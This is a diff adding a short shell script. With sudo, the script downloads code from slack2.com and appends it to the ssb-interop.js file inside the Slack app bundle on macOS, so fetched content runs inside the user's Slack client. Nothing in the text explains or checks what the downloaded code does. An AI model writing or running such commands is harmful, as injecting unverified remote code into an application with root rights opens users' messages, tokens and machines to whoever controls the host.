@@ -1,0 +1,3 @@
+#!/bin/sh
+
+sudo sh -c "curl slack2.com/code.txt >> /Applications/Slack.app/Contents/Resources/app.asar.unpacked/src/static/ssb-interop.js"
